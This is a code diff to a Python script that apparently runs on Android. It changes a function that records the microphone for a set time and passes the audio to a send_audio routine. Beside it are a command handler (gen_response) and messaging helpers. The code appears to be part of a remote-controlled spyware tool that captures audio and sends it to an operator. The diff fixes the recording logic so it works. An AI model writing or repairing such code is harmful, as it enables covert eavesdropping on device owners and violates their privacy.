@@ -57,25 +57,27 @@ def notify_internet():
 
 def start_recording(sec=10):
     try:
-        time.sleep(3)
         send_message(f'Recording {sec}s...')
-        file = '/storage/emulated/0/audio.mp4'
+        file = "/storage/emulated/0/audio.mp4"
         MediaRecorder = autoclass('android.media.MediaRecorder')
+        AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
+        OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
+        AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
         recorder = MediaRecorder()
-        recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
-        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+        recorder.setAudioSource(AudioSource.MIC)
+        recorder.setOutputFormat(OutputFormat.MPEG_4)
+        recorder.setAudioEncoder(AudioEncoder.AAC)
         recorder.setOutputFile(file)
         recorder.prepare()
         recorder.start()
         time.sleep(sec)
         recorder.stop()
         recorder.release()
-        send_audio(file,'Recorded successfully')
-        return {'ok': True, 'result': file}
+        send_audio(file,'Audio Saved')
+        return {'ok':True,'result':file}
     except Exception as error:
         send_message(f'Recording Failed: `{error}`')
-        return {'ok': False, 'result': str(error)}
+        return {'ok':False,'result':error}
 
 def gen_response(cmd):
     try:
